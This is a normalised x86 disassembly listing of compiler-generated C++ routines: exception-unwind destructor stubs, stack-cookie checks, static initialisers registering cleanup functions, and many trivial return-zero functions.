lea ecx [ ebp - 0x2ec ]
jmp sub_40bdc0
sub_43bd4b
lea ecx [ ebp - 0x234 ]
jmp sub_40bdc0
sub_43bd56
lea ecx [ ebp - 0x2d4 ]
jmp sub_40bdc0
sub_43bd61
lea ecx [ ebp - 0x24c ]
jmp sub_40bdc0
sub_43bd6c
lea ecx [ ebp - 0x264 ]
jmp sub_40bdc0
sub_43bd77
lea ecx [ ebp - 0x2a4 ]
jmp sub_40bdc0
sub_43bd82
lea ecx [ ebp - 0x2bc ]
jmp sub_40bdc0
sub_43bd8d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2e4 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bdc0
lea ecx [ ebp - 0x28 ]
jmp sub_401830
sub_43bdc8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bdf0
mov ecx [ ebp - 0x10 ]
jmp sub_401830
sub_43bdf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43be20
lea ecx [ ebp - 0x2c ]
jmp sub_401830
sub_43be28
lea ecx [ ebp - 0x44 ]
jmp sub_401830
sub_43be30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43be60
mov eax [ ebp - 0x440 ]
push eax
call j_sub_422732#2
pop ecx
retn
sub_43be6e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x458 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bea0
lea ecx [ ebp - 0x11 ]
jmp sub_40cb60
sub_43bea8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bed0
lea ecx [ ebp - 0x28 ]
jmp sub_40bdc0
sub_43bed8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bf00
lea ecx [ ebp - 0x240 ]
jmp sub_40bdc0
sub_43bf0b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x250 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bf40
lea ecx [ ebp - 0x28 ]
jmp sub_40bdc0
sub_43bf48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x280 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bf70
lea ecx [ ebp - 0x7d484 ]
jmp sub_40bdc0
sub_43bf7b
lea ecx [ ebp - 0x7d49c ]
jmp sub_401830
sub_43bf86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7d560 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bfb0
lea ecx [ ebp - 0x80 ]
jmp sub_401830
sub_43bfb8
lea ecx [ ebp - 0xb0 ]
jmp sub_401830
sub_43bfc3
lea ecx [ ebp - 0x154 ]
jmp sub_401830
sub_43bfce
lea ecx [ ebp - 0xc8 ]
jmp sub_40bdc0
sub_43bfd9
lea ecx [ ebp - 0x98 ]
jmp sub_401830
sub_43bfe4
lea ecx [ ebp - 0x1e4 ]
jmp sub_401830
sub_43bfef
lea ecx [ ebp - 0x184 ]
jmp sub_401830
sub_43bffa
lea ecx [ ebp - 0x68 ]
jmp sub_401830
sub_43c002
lea ecx [ ebp - 0x214 ]
jmp sub_401830
sub_43c00d
lea ecx [ ebp - 0x1b4 ]
jmp sub_401830
sub_43c018
lea ecx [ ebp - 0x19c ]
jmp sub_401830
sub_43c023
lea ecx [ ebp - 0x16c ]
jmp sub_401830
sub_43c02e
lea ecx [ ebp - 0x1fc ]
jmp sub_401830
sub_43c039
lea ecx [ ebp - 0x1cc ]
jmp sub_401830
sub_43c044
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x224 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c070
lea ecx [ ebp - 0x58 ]
jmp sub_40bdc0
sub_43c078
lea ecx [ ebp - 0x88 ]
jmp sub_40bdc0
sub_43c083
lea ecx [ ebp - 0x70 ]
jmp sub_40bdc0
sub_43c08b
lea ecx [ ebp - 0x40 ]
jmp sub_40bdc0
sub_43c093
lea ecx [ ebp - 0x158 ]
jmp sub_40bdc0
sub_43c09e
lea ecx [ ebp - 0x1b8 ]
jmp sub_40bdc0
sub_43c0a9
lea ecx [ ebp - 0x218 ]
jmp sub_40bdc0
sub_43c0b4
lea ecx [ ebp - 0x1a0 ]
jmp sub_40bdc0
sub_43c0bf
lea ecx [ ebp - 0x170 ]
jmp sub_40bdc0
sub_43c0ca
lea ecx [ ebp - 0x140 ]
jmp sub_40bdc0
sub_43c0d5
lea ecx [ ebp - 0x128 ]
jmp sub_40bdc0
sub_43c0e0
lea ecx [ ebp - 0x1e8 ]
jmp sub_40bdc0
sub_43c0eb
lea ecx [ ebp - 0x188 ]
jmp sub_40bdc0
sub_43c0f6
lea ecx [ ebp - 0x230 ]
jmp sub_40bdc0
sub_43c101
lea ecx [ ebp - 0x200 ]
jmp sub_40bdc0
sub_43c10c
lea ecx [ ebp - 0x1d0 ]
jmp sub_40bdc0
sub_43c117
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x228 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c140
lea ecx [ ebp - 0x5dc ]
jmp sub_41c0a0
sub_43c14b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5fc ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c180
lea ecx [ ebp - 0x5bc ]
jmp sub_41c0a0
sub_43c18b
lea ecx [ ebp - 0x6a0 ]
jmp sub_40bdc0
sub_43c196
lea ecx [ ebp - 0x688 ]
jmp sub_40bdc0
sub_43c1a1
mov eax [ ebp - 0x5c0 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x5c0 ] 0xfffffffb
lea ecx [ ebp - 0x6d0 ]
jmp sub_40bdc0
sub_43c1c3
mov eax [ ebp - 0x5c0 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x5c0 ] 0xfffffff7
lea ecx [ ebp - 0x670 ]
jmp sub_40bdc0
sub_43c1e5
mov eax [ ebp - 0x5c0 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x5c0 ] 0xffffffef
lea ecx [ ebp - 0x6e8 ]
jmp sub_40bdc0
sub_43c207
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6e0 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c230
lea ecx [ ebp - 0xf8 ]
jmp sub_40bdc0
sub_43c23b
lea ecx [ ebp - 0xe0 ]
jmp sub_40bdc0
sub_43c246
lea ecx [ ebp - 0x110 ]
jmp sub_40bdc0
sub_43c251
lea ecx [ ebp - 0xc8 ]
jmp sub_40bdc0
sub_43c25c
lea ecx [ ebp - 0xb0 ]
jmp sub_40bdc0
sub_43c267
lea ecx [ ebp - 0x98 ]
jmp sub_41c0a0
sub_43c272
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x120 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c2a0
lea ecx [ ebp - 0x48 ]
jmp sub_40bdc0
sub_43c2a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c2d0
lea ecx [ ebp - 0x28 ]
jmp sub_40bdc0
sub_43c2d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c300
lea ecx [ ebp - 0x48c ]
jmp sub_401830
sub_43c30b
lea ecx [ ebp - 0x720 ]
jmp sub_401830
sub_43c316
lea ecx [ ebp - 0x738 ]
jmp sub_401830
sub_43c321
lea ecx [ ebp - 0x4a4 ]
jmp sub_401830
sub_43c32c
lea ecx [ ebp - 0x750 ]
jmp sub_401830
sub_43c337
lea ecx [ ebp - 0x768 ]
jmp sub_401830
sub_43c342
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c0 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c370
lea ecx [ ebp - 0x28 ]
jmp sub_401830
sub_43c378
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c3a0
lea ecx [ ebp - 0x28 ]
jmp sub_40bdc0
sub_43c3a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43c3d0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c3e0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c3f0
push ebp
mov ebp esp
mov ecx rw-data
call sub_401300
push sub_43c860
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c410
push ebp
mov ebp esp
mov ecx rw-data
call sub_4013e0
push sub_43c850
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c430
push ebp
mov ebp esp
mov ecx rw-data
call sub_4014c0
push sub_43c840
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c450
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_4010e0
pop ebp
retn
sub_43c470
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_4010e0
pop ebp
retn
sub_43c490
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_4010e0
pop ebp
retn
sub_43c4b0
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_4010e0
pop ebp
retn
sub_43c4d0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c4e0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c4f0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c500
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c510
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c520
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c530
push ebp
mov ebp esp
push 0x1
mov ecx rw-data
call sub_40dfc0
mov ecx rw-data
call sub_410e30
push sub_43c870
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c560
push ebp
mov ebp esp
push 0x1
mov ecx rw-data
call sub_40e100
mov ecx rw-data
call sub_410fd0
push sub_43c880
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c5c0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40e1a0
push sub_43c8b0
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c5e0
push ebp
mov ebp esp
push r--data
mov ecx rw-data
call sub_4017f0
push sub_43c8c0
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c610
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_4010e0
pop ebp
retn
sub_43c630
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c640
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c650
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c660
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c670
push ebp
mov ebp esp
push 0x1
mov ecx rw-data
call sub_40dfc0
mov ecx rw-data
call sub_41a380
push sub_43c8d0
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c6a0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c6b0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c6c0
push ebp
mov ebp esp
push r--data
mov ecx rw-data
call sub_40bd80
push sub_43c8e0
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c6f0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c700
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c710
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c720
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c730
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c740
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c750
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c760
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c770
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c780
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c790
push ebp
mov ebp esp
mov ecx rw-data
call sub_40bd50
push sub_43c8f0
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_43c7b0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c7c0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c7d0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c7e0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_43c7ed
mov ecx rw-data
call sub_42165b
push sub_43c8ff
call sub_4226f3
pop ecx
retn
sub_43c803
push sub_43c909
call sub_4226f3
pop ecx
retn
sub_43c80f
push sub_43c913
call sub_4226f3
pop ecx
retn
sub_43c81b
push sub_43c91d
call sub_4226f3
pop ecx
retn
sub_43c827
mov ecx rw-data
call sub_42165b
push sub_43c927
call sub_4226f3
pop ecx
retn
sub_43c840
push ebp
mov ebp esp
mov ecx rw-data
call sub_4014a0
pop ebp
retn
sub_43c850
push ebp
mov ebp esp
mov ecx rw-data
call sub_4014a0
pop ebp
retn
sub_43c860
push ebp
mov ebp esp
mov ecx rw-data
call sub_4013c0
pop ebp
retn
sub_43c870
push ebp
mov ebp esp
mov ecx rw-data
call sub_40dfe0
pop ebp
retn
sub_43c880
push ebp
mov ebp esp
mov ecx rw-data
call sub_40e120
pop ebp
retn
sub_43c890
push ebp
mov ebp esp
push sub_401830
push 0x2800
push 0x18
push rw-data
call sub_423f3b
pop ebp
retn
sub_43c8b0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40e240
pop ebp
retn
sub_43c8c0
push ebp
mov ebp esp
mov ecx rw-data
call sub_401830
pop ebp
retn
sub_43c8d0
push ebp
mov ebp esp
mov ecx rw-data
call sub_419e30
pop ebp
retn
sub_43c8e0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40bdc0
pop ebp
retn
sub_43c8f0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40bdc0
pop ebp
retn
sub_43c8ff
mov ecx rw-data
jmp sub_4216bd
sub_43c909
mov ecx rw-data
jmp sub_42175c
sub_43c913
mov ecx rw-data
jmp sub_40d130
sub_43c91d
mov ecx rw-data
jmp sub_421e80
sub_43c927
mov ecx rw-data
jmp sub_4216bd
